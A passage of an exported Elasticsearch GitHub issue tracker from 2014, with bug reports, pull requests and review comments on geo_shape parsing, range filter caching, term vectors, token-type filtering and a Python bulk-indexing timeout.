</comment><comment author="bytenik" created="2014-08-01T18:28:10Z" id="50918536">I'm on 1.3.1.

```
{
  "status" : 200,
  "name" : "Steel Serpent",
  "version" : {
    "number" : "1.3.1",
    "build_hash" : "2de6dc5268c32fb49b205233c138d93aaf772015",
    "build_timestamp" : "2014-07-28T14:45:15Z",
    "build_snapshot" : false,
    "lucene_version" : "4.9"
  },
  "tagline" : "You Know, for Search"
}
```
</comment><comment author="clintongormley" created="2014-08-02T07:08:13Z" id="50956134">Ah apologies - I thought #6410 had already been fixed. I'll close this one in favour of #6410.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Added custom transport client settings to test infra</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7129</link><project id="" key="" /><description>It's now possible to define the additional customesettings for transport clients by extending `transportClientSettings` callback method on `ElasticsearchIntegrationTest`.
</description><key id="39310668">7129</key><summary>Test: Added custom transport client settings to test infra</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T17:28:41Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-05T01:13:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-04T07:03:44Z" id="51024082">Left one minor comment but other than that LGTM
</comment><comment author="uboness" created="2014-08-04T22:09:12Z" id="51124960">@jpountz updated
</comment><comment author="uboness" created="2014-08-05T01:13:46Z" id="51138776">merged in 0da5cecc3c628c7cdcf76d12c418ed78ae808e34
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Can't create geo_shape multi field</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7128</link><project id="" key="" /><description>I tried to create a mapping with a multi field where the default type was geo_shape. The mapping created successfully but the field was not created as a multi field. I raised this on the mailing list and it was suggested to raise it as a bug https://groups.google.com/forum/#!topic/elasticsearch/iSeKove6vOQ.

For an example see the gist at https://gist.github.com/owainb/392a5c03b89f2024fb61#file-geo_shape_multi-txt.

Elasticsearch: 1.3.0
OS: Linux 32-bit
JRE: 1.7.0_65
</description><key id="39303043">7128</key><summary>Can't create geo_shape multi field</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">owainb</reporter><labels><label>adoptme</label><label>enhancement</label></labels><created>2014-08-01T15:57:08Z</created><updated>2014-08-08T15:35:34Z</updated><resolved>2014-08-08T15:35:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-01T16:01:13Z" id="50901890">What are you planning on indexing into that field? I'm not sure that any other field type (including geo_point) can make sense of geojson.
</comment><comment author="dadoonet" created="2014-08-01T16:08:07Z" id="50902674">@clintongormley Not sure but I think that you can use that in a plugin and do special transformation there.

At least, if it's not doable we should reject that mapping.
</comment><comment author="owainb" created="2014-08-04T07:59:53Z" id="51027810">I think I misunderstood the capability of mulit-fields. I thought I could store different values in the sub-fields (e.g have a GeoJSON representation in the main field and geo_point representation in the sub-field), but now I think it has to be the same value, and you can just analyse it in different ways?

I do think the mapping should be rejected if it's not valid however. 
</comment><comment author="clintongormley" created="2014-08-04T11:19:41Z" id="51047884">@owainb what you need is just an "object", eg you could index:

```
 {
     "location": {
        "shape": { .....},
        "point": { "lat": 0, "lon": 0}
 }
```

But I agree, the invalid mapping should throw an error.
</comment><comment author="owainb" created="2014-08-04T14:09:23Z" id="51064558">Yeah, that looks like what I want to do. Thanks @clintongormley.
</comment><comment author="colings86" created="2014-08-08T12:28:34Z" id="51594358">@clintongormley the issue with not throwing an error is wider than this specific case. None of the field mappers throw an error if they encounter a field that they don't recognise.  I think this is because the scope of the settings for a field is wider than the mapper for it's type.

In the same object in the mappings (as in these are not split into sub-objects) we have the type declaration, the settings common to all fields (such as store, etc) and the type specific settings. So the field mapper for a particular type does not know at the moment whether a setting it doesn't recognise is an invalid setting or if it is a valid setting that something else will deal with.

I think we should probably open a separate more generalised issue for this and close this issue. what do you think?
</comment><comment author="colings86" created="2014-08-08T15:35:34Z" id="51617851">Closing in favour of #7205 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added an option to add arbitrary headers to the client requests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7127</link><project id="" key="" /><description>The headers are key/value pairs defined in the settings under the `request.headers` namespace.

Also changed test infrastructure's so it'd be possible to define the additional settings for transport clients.
</description><key id="39300666">7127</key><summary>Added an option to add arbitrary headers to the client requests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T15:31:40Z</created><updated>2015-06-06T18:26:52Z</updated><resolved>2014-08-06T02:08:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-01T16:15:53Z" id="50903602">Left some comments, mainly around testing, which is indeed quite a challenge here but I think we can work on it
</comment><comment author="uboness" created="2014-08-01T23:27:01Z" id="50945488">updated... change the test to no depend on the internal cluster infrastructure, but there's till room for improvement
</comment><comment author="javanna" created="2014-08-03T10:15:36Z" id="50986792">Left a couple comments, again around testing , but this looks already much better ;)
</comment><comment author="uboness" created="2014-08-03T17:50:40Z" id="50997476">@javanna updated... have a look
</comment><comment author="javanna" created="2014-08-04T09:35:04Z" id="51036514">Getting closer, left some comments, would love it if somebody else could look at it, especially the tests, @jpountz maybe?
</comment><comment author="javanna" created="2014-08-05T22:23:08Z" id="51268891">LGTM
</comment><comment author="uboness" created="2014-08-06T02:08:47Z" id="51285857">merged by 5a2bf32b19440933e760be7f7f9a9c3e6227ef22
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Geo: geo_shape MultiPolygon parsing problem</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7126</link><project id="" key="" /><description>Trying to index this shape results in an IndexOutOfBoundsException

```
DELETE /countries
PUT /countries
PUT /countries/location/_mapping
{
  "location" : {
    "properties" : {
      "location" : {
        "type" : "geo_shape"
      }
    }
  }
}


PUT countries/location/somewhere-in-sweden
{ "location" : { 
  "type": "MultiPolygon",
  "coordinates": [
    [
      [
        [22.183173, 65.723741],
        [21.213517, 65.026005],
        [21.369631, 64.413588],        
        [22.183173, 65.723741]
      ],
      [
        [17.061767, 57.385783],
        [17.210083, 57.326521],
        [16.430053, 56.179196],        
        [17.061767, 57.385783]
      ]
    ]
  ]
} } 

```

The shape looks valid here https://gist.github.com/spinscale/0c014b3a0f15f90b5c4c
</description><key id="39299574">7126</key><summary>Geo: geo_shape MultiPolygon parsing problem</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">spinscale</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T15:20:36Z</created><updated>2014-08-12T10:01:24Z</updated><resolved>2014-08-12T09:31:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-06T10:15:19Z" id="51316096">The GeoJSON in the index request appears to be invalid as it is specifying a single polygon with a hole outside its bounds.  The correct request, following the geoJSON spec should be:

```
PUT countries/location/somewhere-in-sweden
{ "location" : { 
  "type": "MultiPolygon",
  "coordinates": [
    [
      [
        [22.183173, 65.723741],
        [21.213517, 65.026005],
        [21.369631, 64.413588],        
        [22.183173, 65.723741]
      ]
    ],
    [
      [
        [17.061767, 57.385783],
        [17.210083, 57.326521],
        [16.430053, 56.179196],        
        [17.061767, 57.385783]
      ]
    ]
  ]
} } 
```
</comment><comment author="clintongormley" created="2014-08-07T12:12:29Z" id="51463281">Could we at least throw a nicer error?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Terms Aggregation should only show key_as_string when format is specified</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7125</link><project id="" key="" /><description>Relates to #6655
</description><key id="39293954">7125</key><summary>Aggregations: Terms Aggregation should only show key_as_string when format is specified</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T14:27:57Z</created><updated>2014-08-05T09:42:56Z</updated><resolved>2014-08-05T09:42:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Return found: false for docs requested between index and refresh</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7124</link><project id="" key="" /><description>Closes #7121
</description><key id="39289461">7124</key><summary>Return found: false for docs requested between index and refresh</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/alexksikes/following{/other_user}', u'events_url': u'https://api.github.com/users/alexksikes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/alexksikes/orgs', u'url': u'https://api.github.com/users/alexksikes', u'gists_url': u'https://api.github.com/users/alexksikes/gists{/gist_id}', u'html_url': u'https://github.com/alexksikes', u'subscriptions_url': u'https://api.github.com/users/alexksikes/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/43475?v=4', u'repos_url': u'https://api.github.com/users/alexksikes/repos', u'received_events_url': u'https://api.github.com/users/alexksikes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/alexksikes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'alexksikes', u'type': u'User', u'id': 43475, u'followers_url': u'https://api.github.com/users/alexksikes/followers'}</assignee><reporter username="">alexksikes</reporter><labels><label>:Term Vectors</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T13:33:51Z</created><updated>2015-06-07T12:31:33Z</updated><resolved>2014-08-21T08:03:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-01T14:56:51Z" id="50893758">It would also be nice to mention in the docs that this is a near realtime API and that term vectors are not available until the next refresh.
</comment><comment author="jpountz" created="2014-08-04T07:06:26Z" id="51024354">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adds support for GeoJSON GeometryCollection</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7123</link><project id="" key="" /><description>Closes #2796
</description><key id="39287605">7123</key><summary>Adds support for GeoJSON GeometryCollection</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T13:07:40Z</created><updated>2015-06-07T12:31:44Z</updated><resolved>2014-08-18T13:08:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-18T09:28:29Z" id="52469879">LGTM. I left some comments about cosmetics but feel free to push without further review.
</comment><comment author="spinscale" created="2014-08-18T09:31:35Z" id="52470138">This PR only tests the parsing, does it make sense to test a real query as well, to make sure that having different shapes works as expected (I'd guess so though)?
</comment><comment author="colings86" created="2014-08-18T10:16:05Z" id="52474057">@spinscale Added the test, could you just confirm that this is what you meant before I push?
</comment><comment author="spinscale" created="2014-08-18T11:58:04Z" id="52482602">@colings86 yeah, that was what I meant
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cache range filter on date field by default</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7122</link><project id="" key="" /><description>A range filter on a date field with a numeric `from`/`to` value is **not** cached by default:

```
DELETE /test

PUT /test/t/1
{
  "date": "2014-01-01"
}

GET /_validate/query?explain
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": 0
          }
        }
      }
    }
  }
}
```

Returns:

```
"explanation": "ConstantScore(no_cache(date:[0 TO *]))"
```

This patch fixes as well not caching `from`/`to` when using `now` value not rounded.
Previously, a query like:

```
GET /_validate/query?explain
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "now"
            "to": "now/d+1"
          }
        }
      }
    }
  }
}
```

was cached.

Also, this patch does not cache anymore `now` even if the user asked for caching it.
As it won't be cached at all by definition.

Added as well tests for all possible combinations.

Closes #7114.
</description><key id="39277872">7122</key><summary>Cache range filter on date field by default</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Query DSL</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T10:19:42Z</created><updated>2015-06-07T19:13:17Z</updated><resolved>2014-08-12T14:40:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-01T15:42:24Z" id="50899456">@martijnvg Could you review my PR? Thanks! :) 
</comment><comment author="martijnvg" created="2014-08-12T10:48:50Z" id="51899103">Left two comments, also the SimpleQueryTests#testRangeFilterNoCacheWithNow fails, because it assumes that a filter with now is being cached and that is no longer the case. Can you change that assertion as well?
</comment><comment author="dadoonet" created="2014-08-12T11:05:54Z" id="51900403">I don't understand. When I run test locally, I don't get any error for test `org.elasticsearch.search.query.SimpleQueryTests#testRangeFilterNoCacheWithNow`. Could you paste your seed?
</comment><comment author="martijnvg" created="2014-08-12T13:22:15Z" id="51912528">LGTM, I find the code much more understandable than was before!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>`_termvector` returns `JsonGenerationException` if called between index and refresh</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7121</link><project id="" key="" /><description>To reproduce:

```

DELETE testidx

PUT testidx
{
  "settings": {
    "index.translog.disable_flush": true,
    "index.number_of_shards": 1,
    "refresh_interval": "1h"
  },
  "mappings": {
    "doc": {
      "properties": {
        "text": {
          "type": "string",
          "term_vector": "with_positions_offsets"
        }
      }
    }
  }
}
POST testidx/doc/1
{
  "text": "foo bar"
}

GET testidx/doc/1/_termvector

```

results in 

```
{
   "error": "JsonGenerationException[Current context not an object but ROOT]",
   "status": 500
}
```

A more meaningful error message maybe?
</description><key id="39275368">7121</key><summary>`_termvector` returns `JsonGenerationException` if called between index and refresh</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/alexksikes/following{/other_user}', u'events_url': u'https://api.github.com/users/alexksikes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/alexksikes/orgs', u'url': u'https://api.github.com/users/alexksikes', u'gists_url': u'https://api.github.com/users/alexksikes/gists{/gist_id}', u'html_url': u'https://github.com/alexksikes', u'subscriptions_url': u'https://api.github.com/users/alexksikes/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/43475?v=4', u'repos_url': u'https://api.github.com/users/alexksikes/repos', u'received_events_url': u'https://api.github.com/users/alexksikes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/alexksikes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'alexksikes', u'type': u'User', u'id': 43475, u'followers_url': u'https://api.github.com/users/alexksikes/followers'}</assignee><reporter username="">brwe</reporter><labels><label>bug</label><label>enhancement</label></labels><created>2014-08-01T09:41:52Z</created><updated>2014-08-21T08:02:56Z</updated><resolved>2014-08-21T08:02:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Add `keep_types` for filtering by token type</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7120</link><project id="" key="" /><description>For example, you can use this combined with UAXURLTokenizer to extract urls from text.

This patch works, but I am unsure about the naming of the filter and the parameters.
In fact this filter in lucene supports two modes "stop" and "keep". 
</description><key id="39274555">7120</key><summary>Add `keep_types` for filtering by token type</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>:Analysis</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T09:30:04Z</created><updated>2015-06-06T18:27:06Z</updated><resolved>2014-08-15T13:37:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-01T09:32:31Z" id="50866162">LGTM
</comment><comment author="dweinstein" created="2014-08-01T14:24:03Z" id="50889889">:+1: 
</comment><comment author="dweinstein" created="2014-08-01T14:27:54Z" id="50890367">Will this work for custom patterns? I thought it was great that there existed a UAXURLTokenizer but what if one isn't so lucky in the future and must write one using a custom pattern. What would be the type of those tokens?
</comment><comment author="rmuir" created="2014-08-01T14:46:59Z" id="50892566">Well this is related to token type, which is like a "tag" for the token that is produced by the analysis chain.  Typically the lucene tokenizers provide tags if they recognize different types of tokens, but there is nothing limiting it to that. For example it could contain part-of-speech or whatever is useful.

This filter just filters by tag, it doesnt do tagging itself. It couldn't meet all the possible use cases for token types :)

So to tag by "pattern", we would just need a filter that does that. Its separate from what action to do with the actual tags...
</comment><comment author="rmuir" created="2014-08-01T17:22:53Z" id="50911267">Adding review just for another opinion on the API before pushing it.
</comment><comment author="mikemccand" created="2014-08-04T12:33:15Z" id="51053702">LGTM, except minor naming nit: it's called "keep_types" publicly (I like this name) but in the code it's KeepType (without the s).
</comment><comment author="rmuir" created="2014-08-15T11:46:22Z" id="52297871">Thanks @clintongormley and @mikemccand  

I updated the PR.
</comment><comment author="mikemccand" created="2014-08-15T13:23:29Z" id="52304704">LGTM
</comment><comment author="mikemccand" created="2014-08-15T13:26:37Z" id="52305010">LGTM, thanks for the rename!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Core: Formalize index creation time as part of index metadata</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7119</link><project id="" key="" /><description>We should store a timestamp for when the index was created. This would allow us to do things like index-level TTL or scheduled operations in the future.
</description><key id="39270462">7119</key><summary>Core: Formalize index creation time as part of index metadata</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">dakrone</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T08:25:38Z</created><updated>2014-08-12T20:47:24Z</updated><resolved>2014-08-12T20:46:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Elastic search throwing connection error when trying to use bulk API to index documents</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7118</link><project id="" key="" /><description>PLease help me to understand the following error 

def index_logs(self, index_name, doc_type):
        es = Elasticsearch()
        logger.info ("Connection to elastic search successful")
        no_of_entries = 0
        metadata = {}
        source = {}
        entries = []

```
    for i in range(len(self.store_batt_life_metrics)):
        d = {'_index': 'my-index','_type': 'metrics','_id': DukeMetricsLogic.get_unique_ids(),
                 '@duke_build_numbers': self.duke_builds[i],
                 '@duke_batt_life': self.store_batt_life_metrics[i],
                 '@timestamp': self.duke_time_stamps[i]}
        for key, value in d.items():

            if (key[0] == "_"):
                metadata[key] = value
            else:
                source[key] = value
        entries.append({'index': metadata})
        entries.append(source)
        no_of_entries += 1
    logger.info(": entering bulk indexing")
    es.bulk(index=index_name,doc_type=doc_type,body=entries)
    logger.info("Indexing completed and no. of entries pushed in "
                    "this flush are " + str(no_of_entries))
```

And i get the following error log when i run it 

/usr/bin/python2.7 /home/local/ANT/dandavat/git/power/dukeMetrics/duke_metrics_main.py
INFO:duke_metrics_logic:connecting to S3 to get data
INFO:duke_metrics_logic:Storing battery life to a list
INFO:duke_metrics_logic:getting duke build information
INFO:duke_metrics_logic:getting duke timestamps info..
INFO:duke_metrics_logic:Connection to elastic search successful
INFO:duke_metrics_logic:: entering bulk indexing
WARNING:elasticsearch:POST http://localhost:9200/my-index/metrics/_bulk [status:N/A request:10.101s]
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py", line 46, in perform_request
    response = self.pool.urlopen(method, url, body, retries=False, headers=headers, *_kw)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 559, in urlopen
    _pool=self, _stacktrace=stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/util/retry.py", line 223, in increment
    raise six.reraise(type(error), error, _stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 516, in urlopen
    body=body, headers=headers)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 336, in _make_request
    self, url, "Read timed out. (read timeout=%s)" % read_timeout)
ReadTimeoutError: HTTPConnectionPool(host='localhost', port=9200): Read timed out. (read timeout=10)
WARNING:elasticsearch:Connection &lt;Urllib3HttpConnection: http://localhost:9200&gt; has failed for 1 times in a row, putting on 60 second timeout.
WARNING:elasticsearch:POST http://localhost:9200/my-index/metrics/_bulk [status:N/A request:10.098s]
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py", line 46, in perform_request
    response = self.pool.urlopen(method, url, body, retries=False, headers=headers, *_kw)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 559, in urlopen
    _pool=self, _stacktrace=stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/util/retry.py", line 223, in increment
    raise six.reraise(type(error), error, _stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 516, in urlopen
    body=body, headers=headers)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 336, in _make_request
    self, url, "Read timed out. (read timeout=%s)" % read_timeout)
ReadTimeoutError: HTTPConnectionPool(host='localhost', port=9200): Read timed out. (read timeout=10)
WARNING:elasticsearch:Connection &lt;Urllib3HttpConnection: http://localhost:9200&gt; has failed for 2 times in a row, putting on 120 second timeout.
WARNING:elasticsearch:POST http://localhost:9200/my-index/metrics/_bulk [status:N/A request:10.098s]
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py", line 46, in perform_request
    response = self.pool.urlopen(method, url, body, retries=False, headers=headers, *_kw)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 559, in urlopen
    _pool=self, _stacktrace=stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/util/retry.py", line 223, in increment
    raise six.reraise(type(error), error, _stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 516, in urlopen
    body=body, headers=headers)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 336, in _make_request
    self, url, "Read timed out. (read timeout=%s)" % read_timeout)
ReadTimeoutError: HTTPConnectionPool(host='localhost', port=9200): Read timed out. (read timeout=10)
WARNING:elasticsearch:Connection &lt;Urllib3HttpConnection: http://localhost:9200&gt; has failed for 3 times in a row, putting on 240 second timeout.
WARNING:elasticsearch:POST http://localhost:9200/my-index/metrics/_bulk [status:N/A request:10.104s]
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py", line 46, in perform_request
    response = self.pool.urlopen(method, url, body, retries=False, headers=headers, *_kw)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 559, in urlopen
    _pool=self, _stacktrace=stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/util/retry.py", line 223, in increment
    raise six.reraise(type(error), error, _stacktrace)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 516, in urlopen
    body=body, headers=headers)
  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 336, in _make_request
    self, url, "Read timed out. (read timeout=%s)" % read_timeout)
ReadTimeoutError: HTTPConnectionPool(host='localhost', port=9200): Read timed out. (read timeout=10)
WARNING:elasticsearch:Connection &lt;Urllib3HttpConnection: http://localhost:9200&gt; has failed for 4 times in a row, putting on 480 second timeout.
Traceback (most recent call last):
  File "/home/local/ANT/dandavat/git/power/dukeMetrics/duke_metrics_main.py", line 24, in &lt;module&gt;
    sys.exit(main())
  File "/home/local/ANT/dandavat/git/power/dukeMetrics/duke_metrics_main.py", line 20, in main
    dukemetricslogic.index_logs(index_name='my-index', doc_type='metrics')
  File "/home/local/ANT/dandavat/git/power/dukeMetrics/duke_metrics_logic.py", line 188, in index_logs
    es.bulk(index=index_name,doc_type=doc_type,body=entries)
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/client/utils.py", line 68, in _wrapped
    return func(_args, params=params, *_kwargs)
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/client/__init__.py", line 646, in bulk
    params=params, body=self._bulk_body(body))
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/transport.py", line 276, in perform_request
